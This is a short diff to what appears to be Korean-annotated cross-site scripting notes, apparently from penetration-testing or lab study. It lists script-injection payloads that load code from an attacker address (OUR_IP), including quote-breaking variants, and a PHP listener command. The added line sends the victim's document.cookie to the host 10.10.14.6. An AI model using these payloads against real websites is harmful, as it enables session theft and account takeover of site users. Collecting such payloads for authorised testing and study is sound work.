@@ -220,6 +220,8 @@ sudo php -S 0.0.0.0:80
 <!-- 외부 스크립트 파일 로드 - 가장 기본적인 방법 -->
 <script src=http://OUR_IP></script>
 
+<script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
+
 <!-- 따옴표로 속성 닫기 후 스크립트 삽입 -->
 '><script src=http://OUR_IP></script>
 "><script src=http://OUR_IP></script>
